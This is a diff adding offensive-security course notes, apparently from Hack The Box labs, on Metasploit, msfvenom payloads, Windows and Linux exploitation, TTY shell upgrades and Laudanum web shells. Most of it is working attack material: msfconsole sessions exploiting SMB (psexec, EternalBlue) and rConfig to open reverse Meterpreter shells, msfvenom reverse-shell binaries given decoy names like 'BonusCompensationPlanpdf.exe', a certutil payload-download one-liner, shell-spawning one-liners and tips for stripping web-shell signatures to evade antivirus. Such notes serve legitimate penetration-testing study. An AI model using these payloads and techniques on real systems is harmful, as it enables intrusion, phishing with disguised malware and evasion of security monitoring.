@@ -43,8 +43,6 @@ In cybersecurity and offensive operations, a **payload** refers to the specific 
 3. **Execution:** Deploy the payload via the exploit vector.
 4. **Interactive Access:** Catch the incoming shell (Reverse Shell) or connect to the bound port (Bind Shell) to begin post-exploitation.
 
----
-
 # Shell Anatomy & Command Interpreters
 
 ## Overview
@@ -424,3 +422,687 @@ function Invoke-PowerShellTcp
     }
 }
 ```
+
+---
+
+# Metasploit & Payload Automation
+
+## Overview
+
+The **Metasploit Framework (MSF)**, maintained by Rapid7, automates vulnerability exploitation, payload creation, and session management. In offensive operations, MSF simplifies delivering staged and non-staged payloads (such as **Meterpreter**) across diverse attack vectors.
+
+Understanding what occurs behind the automated framework interface—from target enumeration to memory-injection stages—is critical to preventing unintended system crashes and bypassing modern Endpoint Detection and Response (EDR) solutions.
+
+## 1. Targeted Enumeration: Nmap to MSF Mapping
+
+Automated exploitation begins with precise service enumeration. For instance, discovering open SMB ports (`445/tcp`) on a Windows target guides module selection within MSF.
+
+```bash
+enamto@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25
+
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds
+```
+
+### Searching Modules in `msfconsole`
+
+```bash
+msf6 > search smb
+```
+
+|**Module Name**|**Type**|**Target Platform**|**Service Vector**|**Utility**|
+|---|---|---|---|---|
+|`exploit/windows/smb/psexec`|Exploit|Windows|SMB (Port 445)|Authenticated Code Execution via Service Manager|
+
+#### Deconstructing Module Naming Conventions
+
+$$\text{Module Path} = \text{[Type]} / \text{[Platform]} / \text{[Service/Protocol]} / \text{[Specific Vector]}$$
+
+## 2. Exploit Configuration & Execution Workflow
+
+Using `exploit/windows/smb/psexec` demonstrates an authenticated SMB attack that drops an arbitrary service binary to execute a payload on the target host.
+
+```
++------------------+     1. Authenticate (SMB)     +--------------------+
+|   Attacker Box   | ----------------------------> |    Target Host     |
+|   (MSF Handler)  |                               |   (Port 445 SMB)   |
+|                  |     2. Create & Start Service |                    |
+|  LHOST: LPORT    | ----------------------------> | ADMIN$ Share       |
+|                  |                               |                    |
+|                  |     3. Staged Connection      |                    |
+|  Meterpreter <---| <============================ | In-Memory DLL Exec |
++------------------+                               +--------------------+
+```
+
+### Step-by-Step Module Configuration
+
+```bash
+msf6 > use exploit/windows/smb/psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
+msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
+msf6 exploit(windows/smb/psexec) > set SMBPass password
+msf6 exploit(windows/smb/psexec) > set SMBUser username
+msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
+msf6 exploit(windows/smb/psexec) > exploit
+```
+
+### Execution Log & Stage Delivery
+
+```bash
+[*] Started reverse TCP handler on 10.10.14.222:4444 
+[*] 10.129.180.71:445 - Connecting to the server...
+[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
+[*] 10.129.180.71:445 - Selecting PowerShell target
+[*] 10.129.180.71:445 - Executing the payload...
+[*] Sending stage (175174 bytes) to 10.129.180.71
+[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000
+
+meterpreter > 
+```
+
+## 3. Deep Dive: Meterpreter Shell vs. Native CLI
+
+**Meterpreter** is an advanced, multi-faceted payload that resides strictly in target memory via Reflective DLL Injection, offering dynamic extension loading without writing artifacts to disk.
+
+```bash
+# Drop from Meterpreter session into system native command shell
+meterpreter > shell
+Process 604 created.
+Channel 1 created.
+
+C:\WINDOWS\system32>
+```
+
+### Capabilities Matrix
+
+|**Feature / Metric**|**Standard Reverse CLI (cmd / bash)**|**Meterpreter Payload (meterpreter)**|
+|---|---|---|
+|**Execution Architecture**|Spawns standard OS terminal process.|In-memory DLL Injection (No disk artifacts).|
+|**Features & Modules**|Limited to native OS commands.|Keylogging, mimikatz integration, pivoting, hash dumping.|
+|**Stealth Level**|Highly visible process creation logs.|Stealthier (resides within injected process memory space).|
+|**Network Resilience**|Single channel; dies if connection drops.|Encrypted TLS channel with auto-reconnect capabilities.|
+
+---
+
+# Payload Crafting with MSFvenom
+
+## Overview
+
+`msfvenom` is the dedicated, standalone payload generation and encoding utility within the Metasploit Framework. It combines the functionality of `msfpayload` and `msfencode` into a single tool, allowing operators to generate raw shellcode, executable binaries (`.exe`, `.elf`), web shells (`.php`, `.aspx`), and injected DLLs without launching the full `msfconsole` environment.
+
+```
+                  +-----------------------------------+
+                  |             MSFvenom              |
+                  +-----------------------------------+
+                                    │
+           ┌────────────────────────┴────────────────────────┐
+           ▼                                                 ▼
++---------------------+                           +---------------------+
+|   Staged Payloads   |                           |  Stageless Payloads |
+| (Small initial stage|                           | (Self-contained,    |
+| fetches main shell) |                           | single execution)   |
++---------------------+                           +---------------------+
+```
+
+## 1. Staged vs. Stageless Payloads
+
+Understanding payload delivery dynamics is essential when selecting the appropriate payload for a given network environment, bandwidth constraint, or evasion requirement.
+
+```
+Staged Delivery:
+[ Attacker ] ──( 1. Small Stager )──> [ Target ] ──( 2. Fetches Stage 2 )──> [ Complete Shell ]
+
+Stageless Delivery:
+[ Attacker ] ───────────────( Complete Single-Binary Payload )───────────────> [ Target Execution ]
+```
+
+### Technical Comparison
+
+|**Dimension**|**Staged Payloads**|**Stageless Payloads**|
+|---|---|---|
+|**Execution Architecture**|A tiny initial bootstrap code (Stage 1 / Stager) executes, allocates memory, connects back to the handler, and fetches the larger payload (Stage 2).|The entire payload binary contains all required shellcode and networking logic in a single self-contained package.|
+|**Metasploit Naming Scheme**|Separated by forward slashes (`/`):<br><br>  <br><br>`windows/meterpreter/reverse_tcp`<br><br>  <br><br>`linux/x86/shell/reverse_tcp`|Separated by underscores (`_`):<br><br>  <br><br>`windows/meterpreter_reverse_tcp`<br><br>  <br><br>`linux/zarch/meterpreter_reverse_tcp`|
+|**Size & Memory Footprint**|Extremely small initial footprint; ideal when memory exploitation limits buffer space.|Larger binary size on disk/network.|
+|**Network Stability**|Vulnerable to high network latency or firewall drops mid-stage transfer.|Highly reliable over unstable networks; no second stage to fetch.|
+|**Evasion Characteristics**|Requires two separate network transmissions (Stage 1 exec + Stage 2 download).|Single network transmission; often preferred for social engineering attachments.|
+
+## 2. Command Anatomy & Flags
+
+Creating standalone binaries with `msfvenom` uses standardized options:
+
+$$\text{msfvenom} -p \text{ [Payload]} \quad \text{LHOST=}[IP] \quad \text{LPORT=}[Port] \quad -f \text{ [Format]} \quad > \text{ [Output File]}$$
+
+### Essential MSFvenom Flags
+
+|**Flag**|**Name**|**Function**|
+|---|---|---|
+|`-p`, `--payload`|Payload Selection|Specifies the target payload path (e.g., `linux/x64/shell_reverse_tcp`).|
+|`-f`, `--format`|Output Format|Specifies the compilation output (e.g., `elf`, `exe`, `raw`, `asp`, `php`, `c`, `python`).|
+|`LHOST`|Local Host|Defines the IP address where the incoming reverse shell connection will land.|
+|`LPORT`|Local Port|Defines the listening port on the attacker handler.|
+|`-a`, `--arch`|Architecture|Specifies the architecture (`x86`, `x64`, `armle`, `mips`).|
+|`--platform`|Platform|Defines the target operating system (`windows`, `linux`, `osx`, `android`).|
+|`-e`, `--encoder`|Encoder|Selects an encoding module to remove bad characters or obfuscate basic signatures (e.g., `x86/shikata_ga_nai`).|
+|`-b`, `--bad-chars`|Bad Characters|Specifies characters to avoid during generation (e.g., `\x00\x0a\x0d`).|
+
+## 3. Practical Binary Generation Examples
+
+### Linux 64-Bit ELF Binary (`.elf`)
+
+Generates a stageless Linux executable that initiates an outbound TCP socket back to `10.10.14.113:443`:
+
+```bash
+enamto@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+```
+
+![[Pasted image 20260812134250.png]]
+
+#### Catching the Linux Session
+
+```bash
+enamto@htb[/htb]$ sudo nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.138.85 60892
+```
+
+### Windows Executable (`.exe`)
+
+Generates a stageless 32-bit Windows PE executable:
+
+```bash
+enamto@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+```
+
+![[Pasted image 20260812134331.png]]
+
+#### Catching the Windows Session
+
+```bash
+enamto@htb[/htb]$ sudo nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.144.5 49679
+Microsoft Windows [Version 10.0.18362.1256]
+
+C:\Users\htb-student\Downloads>
+```
+
+## 4. Multi-Platform MSFvenom Cheat Sheet
+
+```
++----------------------------------------------------------------------------------------------------------+
+| Platform          | Format   | Command Syntax                                                            |
++-------------------+----------+---------------------------------------------------------------------------+
+| Windows x64 Exec  | exe      | msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe  |
+| Linux x64 ELF     | elf      | msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf    |
+| PHP Web Shell     | raw      | msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php    |
+| ASPX Web Shell    | aspx     | msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx     |
+| Python Script     | raw      | msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw        |
+| C Shellcode Array | c        | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f c |
++----------------------------------------------------------------------------------------------------------+
+```
+
+---
+
+# Windows Exploitation, Reconnaissance, & Payload Vectors
+
+## Overview
+
+Windows enterprise infrastructure—especially environments leveraging Active Directory, SMB shares, and hybrid cloud synchronization—presents a wide and complex attack surface. Gaining access requires identifying operating system indicators, understanding historical and current exploit primitives, selecting the proper payload binary format (`.exe`, `.dll`, `.msi`, `.bat`), and leveraging native Windows management interfaces like `cmd.exe` and `PowerShell`.
+
+![[Pasted image 20260812150352.png]]
+## 1. Notable Windows Exploits Matrix
+
+```
+[ Enumeration / Fingerprinting ] ──> [ Vulnerability Identification ] ──> [ Exploit Execution ] ──> [ SYSTEM Shell Session ]
+```
+
+|**Vulnerability / Exploit**|**Identifier / Bulletin**|**Affected Component / Vector**|**Impact & Mechanics**|
+|---|---|---|---|
+|**MS08-067**|KB958644|SMB Service (`Server` service)|Critical remote code execution via stack buffer overflow in NetAPI32.dll (used by Conficker & Stuxnet).|
+|**EternalBlue**|MS17-010 / CVE-2017-0144|SMBv1 Protocol|Kernel pool corruption allowing unauthenticated remote code execution with `NT AUTHORITY\SYSTEM` privileges.|
+|**PrintNightmare**|CVE-2021-34527|Windows Print Spooler (`spoolsv.exe`)|RCE and Local Privilege Escalation (LPE) via malicious driver installation through `RpcAddPrinterDriverEx()`.|
+|**BlueKeep**|CVE-2019-0708|Remote Desktop Protocol (RDP)|Pre-authentication RCE exploiting heap corruption in RDP internal channel handling.|
+|**SigRed**|CVE-2020-1350|Windows Domain Name System (DNS)|Heap-based buffer overflow in `dns.exe` processing SIG resource records (leads to Domain Admin LPE).|
+|**SeriousSam (HiveNightmare)**|CVE-2021-36934|Volume Shadow Copies / Registry ACLs|Insecure file permissions on SAM/SYSTEM registry hives allow non-privileged users to read administrative password hashes.|
+|**ZeroLogon**|CVE-2020-1472|Netlogon Remote Protocol (MS-NRPC)|Cryptographic weakness in AES-CFB8 initialization allows an attacker to reset Domain Controller computer account passwords to null.|
+
+## 2. Reconnaissance & Host Fingerprinting
+
+Identifying a target host as a Windows machine prior to exploitation prevents sending improper payloads and reduces noise.
+
+### TTL (Time To Live) Fingerprinting
+
+Default ICMP reply TTL values indicate the target's operating system family:
+
+- **Windows Default TTL:** `128` (or slightly lower if hops are traversed, e.g., 127/126)
+- **Linux/Unix Default TTL:** `64`
+- **Network Devices (Cisco/Solaris):** `255`
+
+```bash
+enamto@htb[/htb]$ ping 192.168.86.39
+
+64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
+```
+
+### Nmap OS Detection & Banner Grabbing
+
+```bash
+# OS Fingerprinting scan
+enamto@htb[/htb]$ sudo nmap -v -O 192.168.86.39
+
+# Banner grabbing scan using NSE
+enamto@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse
+```
+
+```bash
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393
+```
+
+## 3. Windows Payload Formats & Execution Drivers
+
+Selecting the correct execution binary or script depends on the drop vector and privileges available on the victim.
+
+|**Format**|**File Extension**|**Execution Mechanism**|**Primary Offensive Use Case**|
+|---|---|---|---|
+|**Dynamic-Link Library**|`.dll`|Loaded by `rundll32.exe`, process injection, or DLL Search Order Hijacking.|Escalating to `SYSTEM` or hijacking legitimate binary execution paths.|
+|**Batch Script**|`.bat` / `.cmd`|Executed sequentially by `cmd.exe`.|Automated reconnaissance, adding local users, or spawning persistent backdoors.|
+|**VBScript**|`.vbs`|Executed by Windows Script Host (`wscript.exe` / `cscript.exe`).|Phishing attachments and legacy macro execution.|
+|**Installer Package**|`.msi`|Executed via `msiexec.exe /q /i payload.msi`.|Bypassing restrictive environments via elevated installer privileges (`AlwaysInstallElevated`).|
+|**PowerShell Script**|`.ps1`|Interpreted by `powershell.exe` (.NET CLR).|Fileless in-memory execution, C2 stagers, and advanced post-exploitation modules.|
+
+##  Payload Creation Frameworks & Resources
+
+| **Tool / Resource**                                                             | **Primary Function**                           | **Offensive Utility**                                                                                           |
+| ------------------------------------------------------------------------------- | ---------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
+| [**MSFVenom & Metasploit**](https://github.com/rapid7/metasploit-framework)     | Multi-platform binary generator & C2 framework | Generates custom shellcode, raw binaries (`.exe`, `.elf`), and web shells across platforms.                     |
+| [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings) | Open-source offensive repository               | Provides comprehensive cheat sheets for command injection, payloads, and one-liner transfer scripts.            |
+| [**Mythic C2 Framework**](https://github.com/its-a-feature/Mythic)              | Cross-platform Command & Control (C2)          | Alternative C2 architecture offering custom implants (agents) and extensible communication profiles.            |
+| [**Nishang**](https://github.com/samratashok/nishang)                           | PowerShell offensive framework                 | A collection of PowerShell scripts for initial access, privilege escalation, and in-memory reverse/bind shells. |
+| [**Darkarmour**](https://github.com/bats3c/darkarmour)                          | Binary obfuscation tool                        | Encrypts and obfuscates Windows binaries to evade signature-based Antivirus (AV) detection.                     |
+
+##  Transfer Vectors & Remote Execution Protocols
+
+```
+                          ┌─────────────────────────────────────┐
+                          │    Attacker Payload Repository      │
+                          └──────────────────┬──────────────────┘
+                                             │
+      ┌──────────────────────┬───────────────┴───────────────┬──────────────────────┐
+      ▼                      ▼                               ▼                      ▼
++-----------+          +-----------+                   +-----------+          +-----------+
+|    SMB    |          | Impacket  |                   | Web/HTTP  |          | FTP/TFTP  |
+| C$ / ADMIN$|         | psexec/wmi|                   | certutil  |          | Native CLI|
++-----------+          +-----------+                   +-----------+          +-----------+
+```
+
+- **Impacket Suite:** Python-based networking framework providing direct protocol interaction scripts (`psexec.py`, `wmiexec.py`, `smbclient.py`, and `smbserver.py`) for file transfer and remote code execution.
+- **SMB Shares (`C$`, `ADMIN$`):** Native Windows file sharing protocols allow authenticated users to drop binaries, stage execution scripts, and exfiltrate data over administrative shares.
+- **Native Transfer Protocols (HTTP/FTP/TFTP):** Leveraging built-in Windows utilities (e.g., `certutil -urlcache -split -f http://<IP>/payload.exe payload.exe` or PowerShell `Invoke-WebRequest`) to fetch external payloads.
+- **Metasploit Automated Execution:** Exploitation modules automate binary staging, staging memory allocation, and remote thread execution within a single workflow.
+## 4. End-to-End Exploitation Workflow: MS17-010 (EternalBlue)
+
+### Step 1: Target Discovery Scan
+
+Scan SMB service ports across the network to identify host metrics:
+
+```bash
+enamto@htb[/htb]$ nmap -v -A 10.129.201.97
+```
+
+### Step 2: Vulnerability Verification with Metasploit
+
+Verify susceptibility without crashing the remote SMB service pool:
+
+```bash
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+
+[+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64
+```
+
+### Step 3: Exploit Execution & Shell Catch
+
+```bash
+msf6 > use exploit/windows/smb/ms17_010_psexec
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.201.97
+msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.12
+msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4444
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.12:4444 
+[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
+[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215)
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+## 5. Command Shell Comparison: CMD vs. PowerShell
+
+Dropping into a system shell requires choosing the proper command environment based on stealth requirements and OS architecture.
+
+```
+                  ┌──────────────────────────────────────────────┐
+                  │ Target Windows Host (Interactive Access)     │
+                  └──────────────────────┬───────────────────────┘
+                                         │
+                   ┌─────────────────────┴─────────────────────┐
+                   ▼                                           ▼
+      +------------------------+                  +------------------------+
+      |       cmd.exe          |                  |     PowerShell.exe     |
+      | - Unstructured text    |                  | - Structured .NET      |
+      | - No default logging   |                  | - ScriptBlock Logging  |
+      | - Works on legacy OS   |                  | - AMSI / Execution Pol |
+      +------------------------+                  +------------------------+
+```
+
+|**Decision Criteria**|**CMD (cmd.exe)**|**PowerShell (powershell.exe)**|
+|---|---|---|
+|**Object Model**|Plain Unstructured Text Streams|Rich .NET Framework / C# Objects|
+|**Operational Footprint**|Low logging profile; does not leave ScriptBlock / Module logs by default.|High visibility; subject to AMSI, Transcription, and Event ID 4104 logging.|
+|**Bypass Restrictions**|Not affected by Execution Policies (`Set-ExecutionPolicy`).|Governed by Execution Policies (can be bypassed with `-ExecutionPolicy Bypass`).|
+|**Legacy Compatibility**|Native on all Windows versions (including Windows 2000 / XP).|Installed by default on Windows 7 / Server 2008 and newer.|
+|**Best Used When**|Executing simple `net` commands, batch scripts, or remaining stealthy.|Interacting with Active Directory objects, C2 stagers, and complex post-exploitation scripts.|
+
+---
+
+# Unix/Linux Exploitation & Interactive Shell Upgrading
+
+## Overview
+
+Over 70% of web servers globally run on Unix/Linux-based operating systems. Gaining interactive shell access on these hosts frequently involves identifying web application vulnerabilities, executing remote code execution (RCE) payloads, and upgrading "dumb" non-interactive web shells into fully functional TTY terminals for post-exploitation and lateral movement.
+
+## 1. Core Enumeration & Targeted Vulnerability Assessment
+
+When target scanning reveals web stack components (e.g., Apache, Nginx, MySQL, PHP), enumeration must pivot to identifying hosted web applications and their exact version numbers.
+
+### Nmap Web Server Enumeration
+
+```bash
+enamto@htb[/htb]$ nmap -sC -sV 10.129.201.101
+```
+
+```bash
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 2.0.8 or later
+22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) PHP/7.2.34)
+3306/tcp open  mysql    MySQL (unauthorized)
+```
+
+```
+[ Nmap Enumeration ] ──> [ Identify Web App: rConfig 3.9.6 ] ──> [ Exploit RCE Vector ] ──> [ Web Shell ]
+```
+
+## 2. Exploiting Web Application Vulnerabilities (rConfig 3.9.6 RCE)
+
+`rConfig` is a network configuration management tool. Exploiting an authenticated file upload flaw (`rconfig_vendors_auth_file_upload_rce`) allows uploading a PHP reverse shell payload that executes system commands as the web server user (`apache` or `www-data`).
+
+![[Pasted image 20260812155653.png]]
+
+### Adding External MSF Modules Manually
+
+If a specific Metasploit module (`.rb`) is missing locally:
+
+```bash
+enamto@htb[/htb]$ locate exploits
+# Save external module to:
+# /usr/share/metasploit-framework/modules/exploits/linux/http/rconfig_vendors_auth_file_upload_rce.rb
+```
+
+### Module Execution & Shell Catch
+
+```bash
+msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set RHOSTS 10.129.201.101
+msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set LHOST 10.10.14.111
+msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.111:4444 
+[+] 3.9.6 of rConfig found !
+[*] Uploading file 'olxapybdo.php' containing the payload...
+[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860)
+
+meterpreter > shell
+Process 3958 created.
+sh-4.2$ whoami
+apache
+```
+
+## 3. Linux TTY Shell Upgrading Techniques
+
+Initial web shells spawned by web daemons (`apache`, `nginx`, `www-data`) are non-interactive (**non-TTY**). They lack job control, tab completion, arrow key navigation, and prevent tools like `su`, `sudo`, or `vi` from running properly.
+
+```
++--------------------------+                         +--------------------------+
+|    Non-TTY Web Shell     |                         |  Full Interactive TTY    |
+| - No Tab Completion      |  ====================>  | - Tab Completion         |
+| - Ctrl+C kills shell     |    TTY Upgrade Path     | - Job Control (Ctrl+C)   |
+| - `su` / `sudo` breaks   |                         | - PTY terminal support   |
++--------------------------+                         +--------------------------+
+```
+
+### ->  Spawn Initial PTY Shell
+Establishes basic PTY allocation
+
+Check for Python on the target host and execute the `pty.spawn` module:
+
+```bash
+which python3 || which python
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+### ->  Background the Shell & Modify Terminal Raw Mode
+Fixes Ctrl+C handling and echo on attacker box
+
+Suspend the shell session back to your local terminal and set terminal raw mode:
+
+```bash
+# Press Ctrl + Z inside the netcat session
+zsh: suspended  nc -lvnp 4444
+
+# On your attacker machine:
+stty raw -echo; fg
+```
+### ->  Configure Environment Variables & Window Size
+Restores clear screens, text editors, and terminal dimensions
+
+Reset terminal type and set row/column dimensions matching your local terminal emulator:
+
+```bash
+export TERM=xterm-256color
+
+# Check local rows/cols: stty size (e.g., 40 rows 160 cols)
+stty rows 40 cols 160
+```
+
+## 4. One-Liner PTY Spawning Reference
+
+| **Language / Utility** | **Command Syntax**                                                                                                                        |
+| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
+| **Python 3**           | `python3 -c 'import pty; pty.spawn("/bin/bash")'`                                                                                         |
+| **Python 2**           | `python -c 'import pty; pty.spawn("/bin/bash")'`                                                                                          |
+| **Script Command**     | `/usr/bin/script -qc /bin/bash /dev/null`                                                                                                 |
+| **Socat (Full TTY)**   | `socat file:\`tty`,raw,echo=0 tcp-listen:4444 `*(Attacker)*<br>`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp::4444` _(Target)_ |
+
+---
+
+# Interactive Shell Spawning & TTY Upgrading
+
+## Overview
+
+When dropping onto a target Linux system via remote code execution, initial access usually yields a **non-interactive (dumb) shell**. These shells lack job control, PTY (pseudo-terminal) support, command history, auto-completion, and break when executing interactive binaries (e.g., `su`, `sudo`, `vim`, `ssh`).
+
+Spawning an interactive TTY shell bypasses restricted execution environments ("jail shells") and provides full terminal controls essential for privilege escalation.
+
+## 1. Living Off The Land: Interactive Shell Spawning
+
+If `python` or `python3` is missing on the target host, alternative interpreters and standard system utilities can be leveraged to spawn an interactive shell.
+
+```
+                              ┌─────────────────────────────────────────┐
+                              │     Non-Interactive Web/Dumb Shell      │
+                              └────────────────────┬────────────────────┘
+                                                   │
+         ┌───────────────────┬─────────────────────┼─────────────────────┬───────────────────┐
+         ▼                   ▼                     ▼                     ▼                   ▼
+   +-----------+       +-----------+         +-----------+         +-----------+       +-----------+
+   | /bin/sh   |       | Scripting |         | AWK / SED |         | Find Exec |       | VIM Exec  |
+   |  -i Flag  |       | Perl/Ruby |         | System()  |         | Binary -e |       | :!/bin/sh |
+   +-----------+       +-----------+         +-----------+         +-----------+       +-----------+
+```
+
+### Interpreter & Utility Spawning Cheatsheet
+
+| **Utility / Language** | **Command Syntax**                                             | **Notes**                                                       |
+| ---------------------- | -------------------------------------------------------------- | --------------------------------------------------------------- |
+| **Interactive Shell**  | `/bin/sh -i` or `/bin/bash -i`                                 | Invokes the shell directly in interactive mode (`-i`).          |
+| **Perl**               | `perl -e 'exec "/bin/sh";'`                                    | Executes shell binary directly from Perl runtime.               |
+| **Ruby**               | `ruby -e 'exec "/bin/sh"'`                                     | Spawns standard shell interface via Ruby.                       |
+| **Lua**                | `lua -e 'os.execute("/bin/sh")'`                               | Uses Lua's standard OS execution library.                       |
+| **AWK**                | `awk 'BEGIN {system("/bin/sh")}'`                              | Triggers shell execution during AWK initialization block.       |
+| **Find Utility**       | `find . -exec /bin/sh \; -quit`                                | Uses `find` binary execution flag to spawn shell directly.      |
+| **Find + AWK**         | `find / -name "file" -exec awk 'BEGIN {system("/bin/sh")}' \;` | Chains `find` and `awk` execution primitives.                   |
+| **VIM (Inline)**       | `vim -c ':!/bin/sh'`                                           | Launches VIM and immediately executes an escaped shell command. |
+| **VIM (Interactive)**  | Inside VIM: `:set shell=/bin/sh` then `:shell`                 | Overrides default shell setting and drops into terminal mode.   |
+
+## 2. Privilege Checks & Sudo Permissions
+
+Interactive shells are required to execute commands that prompt for user input, password validation, or terminal interaction.
+
+### Inspecting Sudo Rights (`sudo -l`)
+
+To list allowed administrative commands for the current user session:
+
+```bash
+sh-4.2$ sudo -l
+
+Matching Defaults entries for apache on ILF-WebSrv:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin
+
+User apache may run the following commands on ILF-WebSrv:
+    (ALL : ALL) NOPASSWD: ALL
+```
+
+> **Requirement:** Running `sudo -l` on entries requiring password authentication or interactive input will fail or hang indefinitely in a non-interactive shell. A stable PTY shell must be established first.
+
+### File Binary Permissions Check
+
+```bash
+ls -la /path/to/target/binary
+```
+
+---
+
+# Introduction to Web Shells & Laudanum Framework
+
+## Overview
+
+A **Web Shell** is a browser-based command execution interface dropped onto a web server following successful file upload exploitation, Remote File Inclusion (RFI), Local File Inclusion (LFI) with log poisoning, or administrative misconfigurations (e.g., exposed Tomcat manager consoles or misconfigured FTP web roots).
+
+While web shells provide initial Remote Code Execution (RCE), they are inherently **unstable and stateless**. Their primary operational purpose is to serve as an initial foothold to escalate access and spawn a fully interactive **Reverse Shell** back to the attacker infrastructure.
+
+```
+[ Web Application Vulnerability ] ──> [ Upload Payload (PHP/ASPX/JSP) ] ──> [ Execute Commands via Browser ] ──> [ Upgrade to Reverse Shell ]
+```
+
+## 1. Perimeter Exposure & Web Attack Vectors
+
+In modern enterprise networks, perimeter security heavily restricts incoming access to traditional infrastructure services (like SMB, RDP, or SSH). Consequently, web applications form the largest exposed attack surface during external penetration testing.
+
+### Primary Foothold Vectors
+
+|**Vector / Flaw**|**Operational Mechanism**|**Common Extension Dropped**|
+|---|---|---|
+|**Unrestricted File Upload**|Bypass client-side or weak server-side mime/extension filters on profile photos or document attachments.|`.php`, `.phtml`, `.aspx`, `.jsp`|
+|**LFI / RFI (File Inclusion)**|Poisoning log files (`/var/log/apache2/access.log`, Windows Event logs) or pulling remote scripts.|Raw code execution via wrapper|
+|**Application Deployment**|Utilizing management portals (Tomcat, WebLogic, Axis2) to deploy packaged archives.|`.war`, `.ear`|
+|**FTP Webroot Misconfiguration**|Anonymous or weakly authenticated write access directly to the HTTP root directory.|Direct binary/script drop|
+
+## 2. The Laudanum Web Shell Framework
+
+**Laudanum** is a built-in repository of pre-crafted, security-focused web shell payloads designed for multiple web application architectures (`ASP`, `ASPX`, `JSP`, `PHP`). It includes IP-restriction mechanisms to prevent unauthorized third-party access to the dropped shell.
+
+### Directory Location (Linux / Kali / Parrot OS)
+
+```bash
+/usr/share/laudanum/
+```
+
+### Supported Languages & Modules
+
+- **ASPX / ASP:** Windows IIS servers (.NET Framework)
+- **PHP:** Linux/Apache/Nginx/IIS PHP engines
+- **JSP:** Java Application Servers (Tomcat, GlassFish, WebLogic)
+
+## 3. Practical Workflow: Deploying an ASPX Web Shell
+
+### Step 1: Copy & Prepare the Payload
+
+Copy the default Laudanum ASPX shell to your local working directory and inspect parameters:
+
+```bash
+cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
+```
+
+### Step 2: Configure Access Control & Strip Signatures
+
+To ensure access and bypass basic signature-based Antivirus/EDR detection:
+
+1. Open `demo.aspx` in a text editor.
+2. Edit line 59: Add your attacker IP to the `allowedIps` array (e.g., `allowedIps = "10.10.14.x"`).
+3. **OPSEC Tip:** Strip out default ASCII art headers, author comments, and vendor tags to evade static signature detection.
+
+```C#
+
+// Example IP restriction configuration inside shell.aspx
+string[] allowedIps = new string[] { "10.10.14.x" };
+```
+
+![[Pasted image 20260812191416.png]]
+### Step 3: File Upload & Path Traversal Access
+
+Upload `demo.aspx` through the vulnerable web application form.
+
